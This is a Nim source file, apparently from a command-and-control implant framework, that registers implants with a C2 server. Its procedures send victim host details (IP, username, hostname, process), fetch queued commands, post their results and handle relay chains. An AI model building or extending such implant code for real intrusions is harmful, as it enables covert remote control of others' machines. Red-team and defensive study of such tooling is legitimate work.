#[
    Repository: CommunicationRepository
    Implements CommunicationRepositoryPort
    Uses HttpClientAdapter for C2 communication
]#

import ../../domain/models/implant
import ../adapters/http_client_adapter
import ../mappers/implant_mapper
import asyncdispatch

type
    CommunicationRepository* = object
        ## Repository for C2 server communication
        httpAdapter*: HttpClientAdapter

proc newCommunicationRepository*(): CommunicationRepository =
    ## Create a new CommunicationRepository instance
    result = CommunicationRepository(
        httpAdapter: newHttpClientAdapter()
    )

proc registerWithC2*(repo: CommunicationRepository, implant: Implant, localIP: string, 
                    username: string, hostname: string, osInfo: string, pid: int, 
                    processName: string, isRelay: bool, role: string): Future[(bool, Implant)] {.async.} =
    ## Register implant with C2 server
    ## Returns (success, updatedImplant) with ID preserved
    var entity = toEntity(implant)
    
    # Initialize entity (GET request to get ID and key)
    repo.httpAdapter.init(entity)
    
    if not entity.initialized:
        return (false, implant)
    
    # Post registration request
    repo.httpAdapter.postRegisterRequest(entity, localIP, username, hostname, 
                                        osInfo, pid, processName, false, role)
    
    # Convert entity back to Implant domain model, preserving the ID
    let updatedImplant = toDomain(entity, implant.role)
    return (entity.registered, updatedImplant)

proc reconnectToC2*(repo: CommunicationRepository, implant: Implant): Future[bool] {.async.} =
    ## Reconnect implant to C2 server
    var entity = toEntity(implant)
    
    # Attempt reconnection
    repo.httpAdapter.reconnect(entity)
    
    return entity.initialized and entity.registered

proc getQueuedCommand*(repo: CommunicationRepository, implant: Implant): Future[tuple[guid: string, command: string, args: seq[string]]] {.async.} =
    ## Get queued command from C2 server
    let entity = toEntity(implant)
    let (cmdGuid, cmd, cmdArgs) = repo.httpAdapter.getQueuedCommand(entity)
    
    return (guid: cmdGuid, command: cmd, args: cmdArgs)

proc postCommandResults*(repo: CommunicationRepository, implant: Implant, guid: string, resultStr: string): Future[bool] {.async.} =
    ## Post command results to C2 server
    let entity = toEntity(implant)
    repo.httpAdapter.postCommandResults(entity, guid, resultStr)
    return true  # Assume success

proc postRelayRegisterRequest*(repo: CommunicationRepository, implant: Implant, clientId: string,
                              localIP: string, username: string, hostname: string,
                              osInfo: string, pid: int, processName: string,
                              isRelay: bool, role: string): Future[bool] {.async.} =
    ## Post relay registration request to C2 server
    var entity = toEntity(implant)
    let (assignedId, encryptionKey) = repo.httpAdapter.postRelayRegisterRequest(
        entity, clientId, localIP, username, hostname, osInfo, pid, processName, false, role
    )
    
    return assignedId != "" and encryptionKey != ""

proc postChainInfo*(repo: CommunicationRepository, implant: Implant, agentId: string,
                   chainInfo: string, role: string, connections: int): Future[bool] {.async.} =
    ## Post chain info to C2 server
    let entity = toEntity(implant)
    # Note: chainInfo and connections are not used in current adapter implementation
    # The adapter builds chain info from system info
    repo.httpAdapter.postChainInfo(entity, agentId, "", role, connections)
    return true  # Assume success

